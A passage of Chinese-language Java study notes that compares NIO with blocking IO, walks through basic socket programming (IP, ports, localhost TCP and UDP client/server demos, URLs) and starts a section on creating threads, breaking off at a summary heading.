<p>作者：终端研发部<br>链接：<a href="https://www.zhihu.com/question/439681246/answer/1753604983">https://www.zhihu.com/question/439681246/answer/1753604983</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
<p>NIO是为了弥补IO操作的不足而诞生的，NIO的一些新特性有：非阻塞I&#x2F;O，选择器，缓冲以及管道。管道（Channel），缓冲（Buffer） ，选择器（ Selector）是其主要特征。</p>
<p><img src="https://picx.zhimg.com/80/v2-db587ee075af848892e64f137ea9fd5e_1440w.webp?source=1def8aca" alt="img"></p>
<h5 id="概念解释："><a href="#概念解释：" class="headerlink" title="概念解释："></a>概念解释：</h5><p>Channel——管道实际上就像传统IO中的流，到任何目的地(或来自任何地方)的所有数据都必须通过一个 Channel 对象。一个 Buffer 实质上是一个<a href="https://zhida.zhihu.com/search?content_id=348917546&content_type=Answer&match_order=1&q=%E5%AE%B9%E5%99%A8%E5%AF%B9%E8%B1%A1&zhida_source=entity">容器对象</a>。</p>
<p>Selector——选择器用于监听多个管道的事件，使用传统的<a href="https://zhida.zhihu.com/search?content_id=348917546&content_type=Answer&match_order=1&q=%E9%98%BB%E5%A1%9EIO&zhida_source=entity">阻塞IO</a>时我们可以方便的知道什么时候可以进行读写，而使用非阻塞通道，我们需要一些方法来知道什么时候通道准备好了，选择器正是为这个需要而诞生的。</p>
<h5 id="NIO和传统的IO有什么区别呢"><a href="#NIO和传统的IO有什么区别呢" class="headerlink" title="NIO和传统的IO有什么区别呢?"></a>NIO和传统的IO有什么区别呢?</h5><p><strong>1，IO是面向流的，NIO是面向块（缓冲区）的。</strong></p>
<p>IO面向流的操作一次一个字节地处理数据。一个输入流产生一个字节的数据，一个输出流消费一个字节的数据。，导致了数据的读取和写入效率不佳；</p>
<p>NIO面向块的操作在一步中产生或者消费一个数据块。按块处理数据比按(流式的)字节处理数据要快得多，同时数据读取到一个它稍后处理的缓冲区，需要时可在缓冲区中前后移动。这就增加了处理过程中的灵活性。通俗来说，NIO采取了“预读”的方式，当你读取某一部分数据时，他就会猜测你下一步可能会读取的数据而预先缓冲下来。</p>
<p><strong>2，IO是阻塞的，NIO是非阻塞的。</strong></p>
<p>对于传统的IO，当一个线程调用read() 或 write()时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了。</p>
<p>而对于NIO，使用一个线程发送读取数据请求，没有得到响应之前，线程是空闲的，此时线程可以去执行别的任务，而不是像IO中那样只能等待响应完成。</p>
<p><strong>3，NIO和IO适用场景</strong></p>
<p>NIO是为弥补传统IO的不足而诞生的，但是<a href="https://link.zhihu.com/?target=https://www.baidu.com/s?wd=%E5%B0%BA%E6%9C%89%E6%89%80%E7%9F%AD&tn=24004469_oem_dg&rsv_dl=gh_pl_sl_csd">尺有所短</a><a href="https://link.zhihu.com/?target=https://www.baidu.com/s?wd=%E5%AF%B8%E6%9C%89%E6%89%80%E9%95%BF&tn=24004469_oem_dg&rsv_dl=gh_pl_sl_csd">寸有所长</a>，NIO也有缺点，因为NIO是面向缓冲区的操作，每一次的数据处理都是对缓冲区进行的，那么就会有一个问题，在数据处理之前必须要判断缓冲区的数据是否完整或者已经读取完毕，如果没有，假设数据只读取了一部分，那么对不完整的数据处理没有任何意义。所以每次数据处理之前都要检测缓冲区数据。</p>
<p><strong>那么NIO和IO各适用的场景是什么呢？</strong></p>
<p>如果需要管理同时打开的<a href="https://link.zhihu.com/?target=https://www.baidu.com/s?wd=%E6%88%90%E5%8D%83%E4%B8%8A%E4%B8%87&tn=24004469_oem_dg&rsv_dl=gh_pl_sl_csd">成千上万</a>个连接，这些连接每次只是发送少量的数据，例如<a href="https://zhida.zhihu.com/search?content_id=348917546&content_type=Answer&match_order=1&q=%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E5%99%A8&zhida_source=entity">聊天服务器</a>，这时候用NIO处理数据可能是个很好的选择。</p>
<p>而如果只有少量的连接，而这些连接每次要发送大量的数据，这时候传统的IO更合适。使用哪种处理数据，需要在数据的响应等待时间和检查缓冲区数据的时间上作比较来权衡选择。</p>
<p><strong>4，通俗解释</strong></p>
<h5 id="最后，对于NIO和传统IO，有一个网友讲的生动的例子："><a href="#最后，对于NIO和传统IO，有一个网友讲的生动的例子：" class="headerlink" title="最后，对于NIO和传统IO，有一个网友讲的生动的例子："></a>最后，对于NIO和传统IO，有一个网友讲的生动的例子：</h5><p>以前的流总是堵塞的，一个线程只要对它进行操作，其它操作就会被堵塞，也就相当于水管没有阀门，你伸手接水的时候，不管水到了没有，你就都只能耗在接水（流）上。</p>
<p>nio的Channel的加入，相当于增加了水龙头（有阀门），虽然一个时刻也只能接一个水管的水，但依赖轮换策略，在水量不大的时候，各个水管里流出来的水，都可以得到妥</p>
<p>善接纳，这个关键之处就是增加了一个接水工，也就是Selector，他负责协调，也就是看哪根水管有水了的话，在当前水管的水接到一定程度的时候，就切换一下：临时关上当前水龙头，试着打开另一个水龙头（看看有没有水）。</p>
<p>当其他人需要用水的时候，不是直接去接水，而是事前提了一个水桶给接水工，这个水桶就是Buffer。也就是，其他人虽然也可能要等，但不会在现场等，而是回家等，可以做其它事去，水接满了，接水工会通知他们。</p>
<p>这其实也是非常接近当前社会分工细化的现实，也是统分利用现有资源达到并发效果的一种很经济的手段，而不是动不动就来个并行处理，虽然那样是最简单的，但也是最浪费资源的方式。</p>
<h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><h3 id="1-概述-1"><a href="#1-概述-1" class="headerlink" title="1.概述"></a>1.概述</h3><p>邮件：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/cf09b1139d0685d05e0de851fd49a94d--4166--image-20241002192704353.png" alt="image-20241002192704353"></p>
<ul>
<li>计算机网络： 计算机网络是指将<a href="https://baike.baidu.com/item/%E5%9C%B0%E7%90%86">地理</a>位置不同的具有独立功能的多台<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA/140338">计算机</a>及其外部设备，通过通信线路连接起来，在<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/3997">网络操作系统</a>，<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/6579078">网络管理软件</a>及<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE/4438611">网络通信协议</a>的管理和协调下，实现<a href="https://baike.baidu.com/item/%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB/233480">资源共享</a>和信息传递的计算机系统。 </li>
<li>网络编程的目的：无线电台…传播交流信息，数据交换，通信。</li>
<li><strong>想要达到这个效果需要什么：</strong><ol>
<li>如何让准确的定位网络上的一台主机 192.168.16.124：端口， 定位上这个计算机上的某个资源。</li>
<li>找到了这个主机，如何传输数据呢？</li>
</ol>
</li>
<li>Javaweb:网页编程 、 B&#x2F;S架构</li>
<li>网络编程：TCP&#x2F;IP 、 C&#x2F;S</li>
</ul>
<h3 id="2-网络通信要素"><a href="#2-网络通信要素" class="headerlink" title="2.网络通信要素"></a>2.网络通信要素</h3><p><strong>如何实现网络的通信？</strong></p>
<ul>
<li>通信双方的地址：<ul>
<li>ip：192.168.16.124</li>
<li>端口：5900</li>
</ul>
</li>
<li><strong>规则：网络通信的协议</strong>：TCP&#x2F;IP</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/1248aa7b160d777171d9816f1f8e182c--de8e--image-20241002192722608.png" alt="image-20241002192722608"></p>
<blockquote>
<p>小结：</p>
</blockquote>
<ol>
<li>网络编程中有两个主要的问题：<ul>
<li>如何让准确的定位到网络上的一台或多台主机；</li>
<li>找到主机之后如何通信；</li>
</ul>
</li>
<li>网络编程中的要素：<ul>
<li>IP和端口号：IP</li>
<li>网络通信协议：UDP、TCP</li>
</ul>
</li>
<li>万物皆对象</li>
</ol>
<h3 id="3-IP"><a href="#3-IP" class="headerlink" title="3.IP"></a>3.IP</h3><p>IP 地址：InetAddress</p>
<ul>
<li><p>唯一定位一台网络上的计算机</p>
</li>
<li><p>127.0.0.1： 本机localhost</p>
</li>
<li><p>ip地址的父类</p>
<ul>
<li>&#x3D;&#x3D;IPV4&#x3D;&#x3D;： 127.0.0.1 ,4个字节组成。，0<del>255， 42亿</del>；30亿都在北美，亚洲4亿。2011年就用尽；</li>
<li>&#x3D;&#x3D;IPV6&#x3D;&#x3D;： fe80::f0e0:7383:ad8e:f32f%3 ，128位。8个无符号整数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">2406</span>:da18:ddf:<span class="number">4000</span>:67d5:b226:cad7:125b</span><br></pre></td></tr></table></figure>
</li>
<li><p>公网（互联网）–私网（局域网）</p>
<ul>
<li><p><a href="https://www.jb51.net/network/579228.html">ABCD地址</a></p>
</li>
<li><p>192.168.xx.xx,专门给组织内部使用。</p>
</li>
</ul>
</li>
<li><p>域名：记忆IP问题！</p>
<ul>
<li>IP：<a href="http://www.vip.com/">www.vip.com</a></li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInetAddress</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">byName</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">            System.out.println(byName);</span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">byName2</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">            System.out.println(byName2);</span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">localHost</span> <span class="operator">=</span> InetAddress.getLocalHost();</span><br><span class="line">            System.out.println(localHost);</span><br><span class="line"></span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">byName1</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;www.taobao.com&quot;</span>);</span><br><span class="line">            System.out.println(byName1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">localhost/<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">6pc1/<span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span></span><br><span class="line">www.taobao.com/<span class="number">221.228</span><span class="number">.217</span><span class="number">.213</span></span><br></pre></td></tr></table></figure>

<h3 id="4-端口"><a href="#4-端口" class="headerlink" title="4.端口"></a>4.端口</h3><ul>
<li><p>端口表示计算机上一个程序的进程；</p>
</li>
<li><p>不同的进程有不同的端口号！用来区分软件！</p>
</li>
<li><p>被规定0~65535</p>
</li>
<li><p>TCP，UDP：65535*2个端口 tcp：80 udp：80 单个协议下，端口号不能冲突</p>
</li>
<li><p>端口分类</p>
<ul>
<li>共有端口 0~1023 内置的进程使用<ul>
<li>HTTP：80</li>
<li>HTTP：443 如访问https：&#x2F;&#x2F;<a href="http://www.baidu.com:443/">www.baidu.com:443</a> 访问的还是百度</li>
<li>FTP：21</li>
<li>TELENT：23</li>
</ul>
</li>
<li>程序注册端口：1014-49151，分配给用户和程序<ul>
<li>Tomcat：8080</li>
<li>MySql：3306</li>
<li>Oracle：1521</li>
</ul>
</li>
<li>动态、私有端口：49152~65535</li>
</ul>
</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -ano #查看所有的端口</span><br><span class="line">netstat -nao|<span class="built_in">findstr</span> &quot;<span class="number">7808</span>&quot; #查看指定的端口</span><br><span class="line">tasklist|<span class="built_in">findstr</span> &quot;<span class="number">8696</span>&quot;</span><br></pre></td></tr></table></figure>

<h3 id="5-通信协议"><a href="#5-通信协议" class="headerlink" title="5.通信协议"></a>5.通信协议</h3><p>协议：约定，就好比中国人交流说的是普通话</p>
<p><strong>网络通信协议：</strong> 速率，传输码率，代码结构，传输控制…</p>
<p><strong>问题</strong>：非常的复杂</p>
<p>大事化小：分层</p>
<p><strong>TCP&#x2F;IP协议簇：实际上是一组协议</strong></p>
<p>重要：</p>
<ul>
<li>TCP：用户传输协议</li>
<li>UDP：用户数据报协议</li>
</ul>
<p>出名的协议：</p>
<ul>
<li>TCP：</li>
<li>IP：网络互联协议</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/f1c84981f8b01587eff9be2fc64dd7a6--6362--image-20241002193643594.png" alt="image-20241002193643594"></p>
<p>CP UDP 对比**</p>
<ul>
<li><p>TCP：打电话</p>
<ul>
<li><p>连接，稳定</p>
</li>
<li><p>三次握手，四次挥手</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">最少需要三次，保证稳定连接！</span><br><span class="line">A：你瞅啥？</span><br><span class="line">B：瞅你咋地？</span><br><span class="line">A：干一场</span><br><span class="line"></span><br><span class="line">A：我要分手了</span><br><span class="line">B：我知道你要分手了</span><br><span class="line">B：你真的要分手吗？</span><br><span class="line">A：我真的要分手了</span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端、服务器</p>
</li>
<li><p>传输完成，释放连接，效率低</p>
</li>
</ul>
</li>
<li><p>UDP;发短信</p>
<ul>
<li>不连接，不稳定</li>
<li>客户端、服务端：没有明确的解现</li>
<li>不管有没有准备好，都可以发给你</li>
<li>DDOS：洪水攻击！ 发垃圾包 堵塞线路 （饱和攻击）</li>
</ul>
</li>
</ul>
<h3 id="6-TCP"><a href="#6-TCP" class="headerlink" title="6.TCP"></a>6.TCP</h3><blockquote>
<p><strong>先启动服务端，再启动客户端！！！！</strong></p>
</blockquote>
<p><strong>客户端</strong></p>
<ul>
<li>连接服务器 Socket</li>
<li>发送消息</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TCPClientDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">accept</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1.要知道服务器的地址</span></span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">inetAddress</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line">            <span class="comment">// 2.创建一个socket链接</span></span><br><span class="line">            accept = <span class="keyword">new</span> <span class="title class_">Socket</span>(inetAddress,port);</span><br><span class="line">            <span class="comment">// 3.发送信息IO流</span></span><br><span class="line">            os = accept.getOutputStream();</span><br><span class="line">            os.write(<span class="string">&quot;就这吧，什么鬼？咿呀咿呀哟咿呀咿呀哟&quot;</span>.getBytes());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 关闭资源</span></span><br><span class="line">            <span class="keyword">if</span>(os != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    os.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(accept != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    accept.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>服务器端</strong></p>
<ul>
<li>建立服务的端口 ServerSocket</li>
<li>等待的用户的连接 accept</li>
<li>接收用户的消息</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TCPServerDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 1.有一个地址</span></span><br><span class="line">            serverSocket = <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">9999</span>);</span><br><span class="line">            <span class="comment">// 2.等待客户端连接过来</span></span><br><span class="line">            socket = serverSocket.accept();</span><br><span class="line">            <span class="comment">// 3.读取客户端的消息</span></span><br><span class="line">            is = socket.getInputStream();</span><br><span class="line"></span><br><span class="line">           <span class="comment">/*</span></span><br><span class="line"><span class="comment">           //弃用 会有中文乱码</span></span><br><span class="line"><span class="comment">           byte[] buffer = new byte[1024];</span></span><br><span class="line"><span class="comment">            int len = 0;</span></span><br><span class="line"><span class="comment">            while ((len = is.read(bytes)) != -1)&#123;</span></span><br><span class="line"><span class="comment">                String s = new String(buffer,0,len);</span></span><br><span class="line"><span class="comment">                System.out.println(s);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 管道流</span></span><br><span class="line">            baos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 关闭资源</span></span><br><span class="line">            <span class="keyword">if</span> (baos != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    baos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    is.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (socket != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    socket.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (serverSocket != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    serverSocket.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/51f7dcfcdb8f0cd022e3ccd81021033a--b1f8--image-20241002194149715.png" alt="image-20241002194149715"></p>
<h4 id="2-初识Tomcat"><a href="#2-初识Tomcat" class="headerlink" title="2.初识Tomcat"></a>2.初识Tomcat</h4><blockquote>
<p>Tomcat乱码： conf\logging.properties 把UTF-8改为GBK</p>
</blockquote>
<p>服务端</p>
<ul>
<li>自定义 S</li>
<li>Tomcat服务器 S ：Java后台开发</li>
</ul>
<p>客户端</p>
<ul>
<li>自定义 C</li>
<li>浏览器 B</li>
</ul>
<h3 id="7-UDP"><a href="#7-UDP" class="headerlink" title="7.UDP"></a>7.UDP</h3><p> 发短信：不用连接，需要知道对方的地址 </p>
<h4 id="1-发送消息"><a href="#1-发送消息" class="headerlink" title="1.发送消息"></a>1.发送消息</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPClientDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 1、建立一个Socket</span></span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">datagramSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line">        <span class="comment">// 2、建个包</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;UDP服务器。你好！&quot;</span>;</span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">byName</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9090</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 数据、数据的长度起始、要发送给谁</span></span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">datagramPacket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(msg.getBytes(), msg.getBytes().length, byName, port);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3、 发送包</span></span><br><span class="line">        datagramSocket.send(datagramPacket);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//4、 关闭流</span></span><br><span class="line">        datagramSocket.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPServerDemo011</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//1、 开放端口</span></span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">datagramSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(<span class="number">9090</span>);</span><br><span class="line">        <span class="comment">//2 、接受数据包</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">datagramPacket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(bytes, bytes.length);</span><br><span class="line"></span><br><span class="line">        datagramSocket.receive(datagramPacket);</span><br><span class="line">        System.out.println(datagramPacket.getAddress().getHostAddress());</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(datagramPacket.getData()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3、关闭连接</span></span><br><span class="line">        datagramSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/5470eb5dfe09d3ef6743df8efc80e6d6--759e--image-20241002195004190.png" alt="image-20241002195004190"></p>
<ul>
<li>长串乱码是接受使用的1024的byte</li>
</ul>
<h3 id="8-URL"><a href="#8-URL" class="headerlink" title="8.URL"></a>8.URL</h3><ul>
<li><p><a href="https://www.baidu.com/">https://www.baidu.com</a></p>
</li>
<li><p>统一资源定位符：定位互联网上的某一个资源</p>
</li>
<li><p>DNS域名解析 <a href="http://www.baidu.com/">www.baidu.com</a> —&gt; xxx.xxx.xxxx.xxx…xxx</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">协议：//ip地址：端口号/项目名/资源</span><br></pre></td></tr></table></figure>

<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><h3 id="1、线程实现"><a href="#1、线程实现" class="headerlink" title="1、线程实现"></a>1、线程实现</h3><h4 id="1-线程的创建-三种方式"><a href="#1-线程的创建-三种方式" class="headerlink" title="1.线程的创建(三种方式)"></a>1.线程的创建(三种方式)</h4><blockquote>
<p>1.1 继承Thread类<strong>（重要）</strong></p>
<ul>
<li>自定义线程类继承<code>Thread</code>类；</li>
<li>重写<code>run()</code>方法，编写线程执行体；</li>
<li>创建线程对象，调用<code>start()</code>方法启动线程。</li>
</ul>
</blockquote>
<ul>
<li>可以直接使用lambo表达式开启多线程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName());</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/a93581cde7b6ff6b5e0f388d3dc9bcbb--48bf--image-20241002200418140.png" alt="image-20241002200418140"></p>
<blockquote>
<p>1.2 实现Runnable接口</p>
<ul>
<li><strong>推荐使用Runnable对象,因为Java单继承的局限性</strong>；</li>
<li>自定义线程类实现<code>Runnable</code>接口；</li>
<li>实现<code>run()</code>方法,编写线程执行体；</li>
<li>创建线程对象,调用<code>start()</code>方法启动对象。</li>
</ul>
</blockquote>
<blockquote>
<p>1.3 实现Callable接口（了解）</p>
<ul>
<li>实现Callable接口，需要返回值类型；</li>
<li>重写call方法，需要抛出异常；</li>
<li>创建目标对象；</li>
<li>创建执行服务：ExecutorService ser &#x3D; Executors.newFixedThreadPool(1);</li>
<li>提交执行：Future result1 &#x3D; ser.submit(11);</li>
<li>获取结果：boolean r1 &#x3D; result1.get();</li>
<li>关闭服务：ser.shutdownNow();</li>
</ul>
</blockquote>
<h4 id="2-静态代理"><a href="#2-静态代理" class="headerlink" title="2.静态代理"></a>2.静态代理</h4><p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/0f21687c7dae4f514872b6eca338b761--d6f5--image-20241006132520284.png" alt="image-20241006132520284"></p>
<ul>
<li>总结<ul>
